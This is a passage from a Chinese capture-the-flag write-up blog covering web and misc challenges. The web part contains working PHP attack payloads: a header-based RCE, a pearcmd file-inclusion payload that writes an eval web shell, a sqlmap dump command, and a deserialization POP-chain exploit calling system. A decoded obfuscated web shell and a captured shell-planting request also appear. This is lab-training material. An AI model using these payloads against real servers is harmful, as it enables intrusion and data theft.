R!!C!!E!!</h3><p>无参 RCE + 过滤</p><p><img src="https://s2.loli.net/2024/03/08/Kz63HSouAeiXw74.png" alt=""></p><p>进去拿到提示，存在信息泄露，F12 简单看没有东西</p><p>dirsearch 扫一下</p><p><img src="https://s2.loli.net/2024/03/08/2jO6zebvAx7IMNW.png" alt=""></p><p>全部是 429（Too Many Requests）</p><p>加个时间限制，-s 1   （间隔一秒）<a href="https://blog.csdn.net/qq_43936524/article/details/115271837">dirsearch 用法大全</a></p><p><img src="https://s2.loli.net/2024/03/08/brAwZ3FxDJmMlti.png" alt=""></p><p>.git 泄露</p><p>用 githack 扫一下</p><p><img src="https://s2.loli.net/2024/03/08/iTK2tx6Ooc8yqGB.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/HVCtWDlirQLMcwF.png" alt=""></p><p>找到文件了，访问/bo0g1pop.php</p><p><img src="https://s2.loli.net/2024/03/08/g5DGqXoKPs7fd26.png" alt=""></p><p><a href="https://www.cnblogs.com/pursue-security/p/15406272.html">RCE 篇之无参数 rce - 学安全的小白 - 博客园</a></p><p><img src="https://s2.loli.net/2024/03/08/ObnAI2w79tJELNP.png" alt=""></p><p>无参 RCE，但是本题还有过滤，经过一番搜索最后成功构造 payload：</p><p><code>?star=eval(next(getallheaders()));user-Agent：system(&#39;tac /flag&#39;);</code></p><p><img src="https://s2.loli.net/2024/03/08/VpfR32PWnT1Lyqa.png" alt=""></p><blockquote><p>我猜是因为第一个是 Upgrade，UA 在第二个所以用 next()</p></blockquote><p>附锅老师的操作：</p><p><img src="https://s2.loli.net/2024/03/08/QHi1UxFILdEmaZN.png" alt=""></p><h3 id="WEEK3-Include-🍐"><a href="#WEEK3-Include-🍐" class="headerlink" title="[WEEK3] Include 🍐"></a>[WEEK3] Include 🍐</h3><p>pearcmd</p><p><img src="https://s2.loli.net/2024/03/08/s46Wr5VeOz8MA9x.png" alt=""></p><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP 裸文件本地包含综述 | 离别歌</a></p><p><img src="https://s2.loli.net/2024/03/08/hlveEgsBtDOrZHq.png" alt=""></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/">register_argc_argv 与 include to RCE 的巧妙组合 - Longlone’s Blog</a></p><p><code>Payload:?file=pearcmd&amp;+config-create+/&lt;?=eval($_POST[&#39;a&#39;]);?&gt;+/tmp/2.php</code></p><p><img src="https://s2.loli.net/2024/03/08/RH4kQdrzaUPfTZW.png" alt=""></p><p><strong>用 BP 传，url 直接传会被编码导致转义</strong></p><p>然后包含文件，include 会执行 2.php 的代码，我们 post 传值即可</p><p><img src="https://s2.loli.net/2024/03/08/SE9H7ledks8RAvM.png" alt=""></p><h3 id="WEEK3-medium-sql"><a href="#WEEK3-medium-sql" class="headerlink" title="[WEEK3] medium_sql"></a>[WEEK3] medium_sql</h3><p>sqlmap 时间盲注</p><p>sqlmap 做就行，注意调线程和时延，直接报不行的</p><p>这里只直接给最后的 payload：</p><p>sqlmap -u URL/?id=TMP5978 —batch -t 10 —delay 1 -D ctf -T here_is_flag -C flag —dump</p><p><img src="https://s2.loli.net/2024/03/08/rijIxTKEWayQmAJ.png" alt=""></p><h3 id="WEEK3-POP-Gadget"><a href="#WEEK3-POP-Gadget" class="headerlink" title="[WEEK3] POP Gadget"></a>[WEEK3] POP Gadget</h3><p> 反序列化</p><p>pop 链：</p><p>whitegod(func=system,var=ls) -&gt; ctf(handle=$whitegod) -&gt; handle(obj=$ctf) -&gt; super(obj=$handle) -&gt; then(func=$super) -&gt; begin(name=$then)</p><p>EXP:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$whitegod</span>=<span class="keyword">new</span> <span class="title class_">WhiteGod</span>();</span><br><span class="line"><span class="variable">$ctf</span>=<span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>();</span><br><span class="line"><span class="variable">$super</span>=<span class="keyword">new</span> <span class="title class_">Super</span>();</span><br><span class="line"><span class="variable">$handle</span>=<span class="keyword">new</span> <span class="title class_">Handle</span>();</span><br><span class="line"><span class="variable">$then</span>=<span class="keyword">new</span> <span class="title class_">Then</span>();</span><br><span class="line"><span class="variable">$begin</span>=<span class="keyword">new</span> <span class="title class_">Begin</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$whitegod</span>-&gt;func=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$whitegod</span>-&gt;<span class="keyword">var</span>=<span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line"><span class="variable">$ctf</span>-&gt;handle=<span class="variable">$whitegod</span>;</span><br><span class="line"><span class="variable">$handle</span>-&gt;obj=<span class="variable">$ctf</span>;</span><br><span class="line"><span class="variable">$super</span>-&gt;obj=<span class="variable">$handle</span>;</span><br><span class="line"><span class="variable">$then</span>-&gt;func=<span class="variable">$super</span>;</span><br><span class="line"><span class="variable">$begin</span>-&gt;name=<span class="variable">$then</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$begin</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Payload:<br>O:5:”Begin”:1:{s:4:”name”;O:4:”Then”:1:{s:4:”func”;O:5:”Super”:1:{s:3:”obj”;O:6:”Handle”:1:{s:3:”obj”;O:3:”CTF”:1:{s:6:”handle”;O:8:”WhiteGod”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:9:”tac /flag”;}}}}}}</strong></p><p><img src="https://s2.loli.net/2024/03/08/RAzrUYThCmtSXPx.png" alt=""></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="CyberChef’s-Secret"><a href="#CyberChef’s-Secret" class="headerlink" title="CyberChef’s Secret"></a>CyberChef’s Secret</h3><p>  base32 58 64</p><p><img src="https://s2.loli.net/2024/03/08/Ksln7oPb86vAVyW.png" alt=""></p><p><a href="https://cyberchef.org/">cyberchef.org</a></p><p><img src="https://s2.loli.net/2024/03/08/9KwfvjNBxZWqYuS.png" alt=""></p><h3 id="机密图片"><a href="#机密图片" class="headerlink" title="机密图片"></a>机密图片</h3><p>lsb 隐写</p><p><img src="https://s2.loli.net/2024/03/08/lSzoZwFBRqmdgPD.png" alt=""></p><p>扫码没啥消息</p><p>stegsolve 发现顶部有字符串</p><p><img src="https://s2.loli.net/2024/03/08/mjtRuUq2nDAx7by.png" alt=""></p><p>Data extract</p><p>选最低位即可</p><p><img src="https://s2.loli.net/2024/03/08/Q7hq8zKYOP9ijnI.png" alt=""></p><h3 id="流量！鲨鱼！"><a href="#流量！鲨鱼！" class="headerlink" title="流量！鲨鱼！"></a>流量！鲨鱼！</h3><p>流量分析</p><p><img src="https://s2.loli.net/2024/03/08/W3LMuKFkT7gBRmn.png" alt=""></p><p>导出 http 对象</p><p><img src="https://s2.loli.net/2024/03/08/jQsko2giLywNqAd.png" alt=""></p><p>导出 flag 文件</p><p><img src="https://s2.loli.net/2024/03/08/iptnxkIA2XbOgl5.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/uNPxd2BLnfphjQT.png" alt=""></p><h3 id="压缩包们"><a href="#压缩包们" class="headerlink" title="压缩包们"></a>压缩包们</h3><p>binwalk 密码爆破</p><p><img src="https://s2.loli.net/2024/03/08/QETDKrvtecHli7M.png" alt=""></p><p>无后缀，010 打开</p><p><img src="https://s2.loli.net/2024/03/08/Z7bOrDYvTxJpLs3.png" alt=""></p><p>里面有压缩文件，binwalk 分离</p><p><img src="https://s2.loli.net/2024/03/08/PQHlBAWjknaT3hw.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/Y7VILTqwe45M1Rp.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/Aj5JYk4Ci3BHZpR.png" alt=""></p><p>备注解密得到字符串 <strong>I like six-digit numbers because they are very concise and easy to remember.</strong></p><p>6 位数字密码爆破，这里用 zipello</p><p><img src="https://s2.loli.net/2024/03/08/DVxAG9QJfTePHZa.png" alt=""></p><p>打开得到 flag</p><p><img src="https://s2.loli.net/2024/03/08/7ZiTAFQpruP6Yqj.png" alt=""></p><h3 id="空白格"><a href="#空白格" class="headerlink" title="空白格"></a>空白格</h3><p>   whitespace</p><p><img src="https://s2.loli.net/2024/03/08/Hh8Q6XAM5ECxUBr.png" alt=""></p><p>起初以为是 snow，后来了解到 whitespace</p><p><a href="https://www.w3cschool.cn/tryrun/runcode?lang=whitespace">whitespace 在线运行,在线工具，在线编译 IDE_w3cschool</a></p><p><img src="https://s2.loli.net/2024/03/08/m1RUQfXicYnyGNZ.png" alt=""></p><p>复制粘贴运行得到 flag</p><h3 id="隐秘的眼睛"><a href="#隐秘的眼睛" class="headerlink" title="隐秘的眼睛"></a>隐秘的眼睛</h3><p>silenteye</p><p><img src="https://s2.loli.net/2024/03/08/MchoLlKNx2H5YzZ.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/dmPBwh2fYOcgvx8.png" alt=""></p><p>全部默认解密即可</p><h3 id="新建-Word-文档"><a href="#新建-Word-文档" class="headerlink" title="新建 Word 文档"></a>新建 Word 文档</h3><p>word</p><p>打开都是空白，标题那里随便点一个就出来了</p><p><img src="https://s2.loli.net/2024/03/08/lt4CEbdesXvLIVT.png" alt=""></p><p><a href="http://hi.pcmoe.net/Buddha.html">新约佛论禅/佛曰加密 - PcMoe!</a></p><p><img src="https://s2.loli.net/2024/03/08/BoD9nNWFOtM5fT1.png" alt=""></p><p><strong>flag{Th1s_F0_1s_s00_Cyp3r_495586e3df3a}</strong></p><h3 id="永不消逝的电波"><a href="#永不消逝的电波" class="headerlink" title="永不消逝的电波"></a>永不消逝的电波</h3><p>morse</p><p><a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">Morse Code Adaptive Audio Decoder</a></p><p><img src="https://s2.loli.net/2024/03/08/qc5dCJteZDh6HuN.png" alt=""></p><p><strong>flag{thebestctferisyou}</strong></p><h3 id="base"><a href="#base" class="headerlink" title="base!"></a>base!</h3><p>   base64 隐写</p><p><a href="https://blog.csdn.net/qq_43431158/article/details/109525795">https://blog.csdn.net/qq_43431158/article/details/109525795</a></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_base64_diff_value</span>(<span class="params">s1, s2</span>):</span><br><span class="line">    base64chars = <span class="string">b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_stego</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;xxx&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f: <span class="comment">#文件放这里</span></span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">b&#x27;&#x27;</span>  <span class="comment"># 使用字节串</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">            norm_line = base64.b64encode(base64.b64decode(steg_line)).replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="built_in">print</span>(diff)</span><br><span class="line">            pads_num = steg_line.count(<span class="string">b&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += <span class="built_in">bin</span>(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>).encode()  <span class="comment"># 将二进制字符串转换为字节串</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">b&#x27;0&#x27;</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="built_in">print</span>(goflag(bin_str))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">goflag</span>(<span class="params">bin_str</span>):</span><br><span class="line">    res_str = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += <span class="built_in">bytes</span>([<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)])</span><br><span class="line">    <span class="keyword">return</span> res_str.decode()  <span class="comment"># 将字节串转换为字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/08/ur1sfTL5kANHDyU.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/xrmLPQ2yt7GvhjE.png" alt=""></p><h3 id="1-序章"><a href="#1-序章" class="headerlink" title="1-序章"></a>1-序章</h3><p>sql 盲注日志分析</p><p>先把文件 url 解码一下，然后分析</p><p><img src="https://s2.loli.net/2024/03/08/4VgamyubWnDrHZ3.png" alt=""></p><p>1,1 2,1 3,1 …x,1</p><p>当注入到某一位的正确字符后会结束这一位的爆破，进行下一位的注入</p><p>每一个的最后一行的数字转 ascii 字符即可</p><p>手撸出来的</p><p><img src="https://s2.loli.net/2024/03/08/7fzZC8IF9QmiyRj.png" alt=""></p><p>官方脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"> </span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;access.log&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">lines = f.readlines()</span><br><span class="line">datas = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    t = urllib.unquote(line) </span><br><span class="line">    datas.append(t)</span><br><span class="line"> </span><br><span class="line">flag_ascii = &#123;&#125;  </span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">    matchObj = re.search( <span class="string">r&#x27;user\),(.*?),1\)\)=(.*?),sleep&#x27;</span>, data)</span><br><span class="line">    <span class="keyword">if</span> matchObj:</span><br><span class="line">        key = <span class="built_in">int</span>(matchObj.group(<span class="number">1</span>))</span><br><span class="line">        value = <span class="built_in">int</span>(matchObj.group(<span class="number">2</span>))</span><br><span class="line">        flag_ascii[key] = value</span><br><span class="line">        </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> flag_ascii.values():</span><br><span class="line">    flag += <span class="built_in">chr</span>(value)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><h3 id="WebShell-的利用"><a href="#WebShell-的利用" class="headerlink" title="WebShell 的利用"></a>WebShell 的利用</h3><p>多层嵌套解密，rce</p><p>打开 index.php 里面是这个代码，xxx 是大量的密文</p><p>&lt;?php</p><p>eval(str_rot13(convert_uudecode(str_rot13(base64_decode(‘xxx’)))));</p><p>?&gt;</p><p>手动进行一次解密后发现还是这个模式的解密</p><p>eval(str_rot13(convert_uudecode(str_rot13(base64_decode(‘xxx（此时的密文量减少了）’)))));</p><p>脚本解密，发现解密十次可以拿到 payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">custom_decrypt</span>(<span class="params"><span class="variable">$ciphertext</span>, <span class="variable">$num_iterations</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$num_iterations</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$decoded</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$ciphertext</span>);</span><br><span class="line">        <span class="variable">$decoded</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$decoded</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// UU解码</span></span><br><span class="line">        <span class="variable">$decoded</span> = <span class="title function_ invoke__">convert_uudecode</span>(<span class="variable">$decoded</span>);</span><br><span class="line">                <span class="variable">$decoded</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$decoded</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$decoded</span>, <span class="number">0</span>, <span class="number">57</span>) === <span class="string">&quot;eval(str_rot13(convert_uudecode(str_rot13(base64_decode(&#x27;&quot;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$decoded</span>, -<span class="number">7</span>) === <span class="string">&quot;&#x27;)))));&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$decoded</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$decoded</span>, <span class="number">57</span>, -<span class="number">7</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ciphertext</span> = <span class="variable">$decoded</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ciphertext</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输入你的密文和解密次数</span></span><br><span class="line"><span class="variable">$encrypted_text</span> = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line"><span class="variable">$iterations</span> = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用函数进行解密</span></span><br><span class="line"><span class="variable">$decrypted_text</span> = <span class="title function_ invoke__">custom_decrypt</span>(<span class="variable">$encrypted_text</span>, <span class="variable">$iterations</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$decrypted_text</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/08/oHXOm4tNgZ8iPqk.png" alt=""></p><p>套上前面的 eval()</p><p>即为 eval(error_reporting(0);($_GET[‘7d67973a’])($_POST[‘9fa3’]););</p><p>前面 get 的值作为函数</p><p>后面 post 的值为函数内的内容</p><p><img src="https://s2.loli.net/2024/03/08/xF1zTjNiGUpachL.png" alt=""></p><h3 id="Jvav"><a href="#Jvav" class="headerlink" title="Jvav"></a>Jvav</h3><p>java 盲水印</p><p><a href="https://harvey.plus/index.php/archives/71/#toc-Java%E7%9B%B2%E6%B0%B4%E5%8D%B0">CTF-图片隐写那些事儿 - Mssn Harvey - CTFer &amp;&amp; DreamRedteam</a></p><p><strong>java -jar BlindWatermark-v0.0.3-windows-x86_64.jar decode -c 题目.jpg 解密.jpg</strong></p><p><img src="https://s2.loli.net/2024/03/08/uXYfb9ZgdRKVrML.png" alt=""></p><h3 id="阳光开朗大男孩"><a href="#阳光开朗大男孩" class="headerlink" title="阳光开朗大男孩"></a>阳光开朗大男孩</h3><p>   社会主义解密  emoji-aes 解密</p><p>两个文件，secret.txt 是社会主义</p><p><img src="https://s2.loli.net/2024/03/08/aLWgYVTB76qU9yZ.png" alt=""></p><p>解密得到   this_password_is_s000_h4rd_p4sssw0rdddd</p><p>观察到 is 后面的才用数字代替字母的格式，猜测密码为：s000_h4rd_p4sssw0rdddd</p><p>flag.txt 是 emoji-aes 加密</p><p><img src="https://s2.loli.net/2024/03/08/IyPgDLrzSf7YM2J.png" alt=""></p><p>在线：<a href="https://aghorler.github.io/emoji-aes/">https://aghorler.github.io/emoji-aes/</a></p><p><img src="https://s2.loli.net/2024/03/08/IaKzhNg5FQ7AyEn.png" alt=""></p><h3 id="大怨种"><a href="#大怨种" class="headerlink" title="大怨种"></a>大怨种</h3><p>gif 抓帧 汉信码</p><p>题目给到的是 gif 图，观察有一张二维码闪过</p><p>Stegsolve 梭</p><p><img src="https://s2.loli.net/2024/03/08/bqwNulfoS4IWxnY.png" alt=""></p><p><a href="https://tuzim.net/hxdecode/">在线汉信码识别,汉信码解码 - 兔子二维码</a></p><p><img src="https://s2.loli.net/2024/03/08/Dpl9VLqfX4GoIjR.png" alt=""></p><h3 id="2-分析"><a href="#2-分析" class="headerlink" title="2-分析"></a>2-分析</h3><p>取证 流量分析</p><p><img src="https://s2.loli.net/2024/03/08/ioZIuOdqgDW2X4A.png" alt=""></p><blockquote><p>flag{md5(攻击者登录使用的用户名_存在漏洞的文件名_WebShell 文件名)}</p></blockquote><p>wireshark 打开，检查 http 流量</p><p>length 从大到小来看</p><p>先看到 login.php 里面发送了请求</p><p><img src="https://s2.loli.net/2024/03/08/eirTNIFGmkB7RAX.png" alt=""></p><p>追踪 http</p><p><img src="https://s2.loli.net/2024/03/08/aeUsXljrF8ubtyg.png" alt=""></p><p>找到用户名：best_admin</p><p>继续往下看可以看到：</p><p><img src="https://s2.loli.net/2024/03/08/1X8UsTjSgknFa4t.png" alt=""></p><p>/index.php?page=/../../../../usr/share/php/pearcmd&amp;+config-create+/&amp;&lt;?=system($_GET[‘a’])?&gt;+/var/www/html/wh1t3g0d.php</p><p>这里是在漏洞文件里进行了远程木马的上传，木马文件为 wh1t3g0d.php，漏洞文件为 index.php</p><pre><code>shell文件：wh1t3g0d.php漏洞文件：index.php用户名：best_admin</code></pre><p><img src="https://s2.loli.net/2024/03/08/gRW2EtscFDbPxh7.png" alt=""></p><p><strong>flag{4069afd7089f7363198d899385ad688b}</strong></p><h3 id="滴滴滴"><a href="#滴滴滴" class="headerlink" title="滴滴滴"></a>滴滴滴</h3><p>dtmf 拨号音  steghide</p><p>拿到音频听了一下发现是手机拨号的按键音</p><p>命令：dtmf2num xxx.wav</p><p><img src="https://s2.loli.net/2024/03/08/NxK4EhPlc2X9OYp.png" alt=""></p><p>密码：52563319066</p><p>还有一张图，尝试 steghide 解密</p><p>成功得到 flag</p><h3 id="键盘侠"><a href="#键盘侠" class="headerlink" title="键盘侠"></a>键盘侠</h3><p>   usb 键盘流量提取</p><p>参考：<a href="https://blog.csdn.net/qq_43625917/article/details/107723635">CTF 流量分析常见题型(二)-USB 流量_ctf usb 流量分析-CSDN 博客</a></p><p>tshark -r xxx.pcapng -T fields -e usb.capdata &gt; output.txt  （提取 usb）</p><p>tshark -r xxx.pcapng -T fields -e usb.capdata | sed ‘/^\s*$/d’ &gt; output.txt  （并且去掉空行）</p><blockquote><p>但是这里报错了，并且按网上方法改也没成功，所以用了别的方法</p></blockquote><p>tshark -T json -r xxx.pcapng &gt;123.json （改 json 格式输出）</p><p>然后只提取 usbhid.data 的内容</p><p>strings 123.json | grep “usbhid.data” &gt; 123.txt</p><p><img src="https://s2.loli.net/2024/03/08/MkTtCXh5G8em9Lp.png" alt=""></p><p>调整一下格式，删去前缀和引号</p><p><img src="https://s2.loli.net/2024/03/08/YoNEhn76tkViurO.png" alt=""></p><p>上脚本：</p><pre><code>python#!/usr/bin/env python# -*- coding:utf-8 -*-normalKeys = &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, 